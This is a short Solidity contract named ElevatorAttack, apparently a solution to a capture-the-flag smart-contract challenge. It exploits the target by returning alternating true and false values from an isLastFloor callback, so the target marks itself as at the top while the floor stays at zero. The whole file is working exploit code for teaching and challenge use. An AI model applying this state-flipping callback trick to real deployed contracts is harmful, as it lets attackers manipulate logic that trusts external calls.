// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interfaces/IElevator.sol";

contract ElevatorAttack {
    IElevator private immutable target;
    bool private _isLastFloor = true;

    constructor(IElevator target_) {
        target = target_;
    }

    function attack() external {
        target.goTo(0);

        require(target.top() && 0 == target.floor(), "Elevator: Attack failed");
    }

    function isLastFloor(
        uint256 /* floor */
    ) external returns (bool) {
        return _isLastFloor = !_isLastFloor;
    }
}
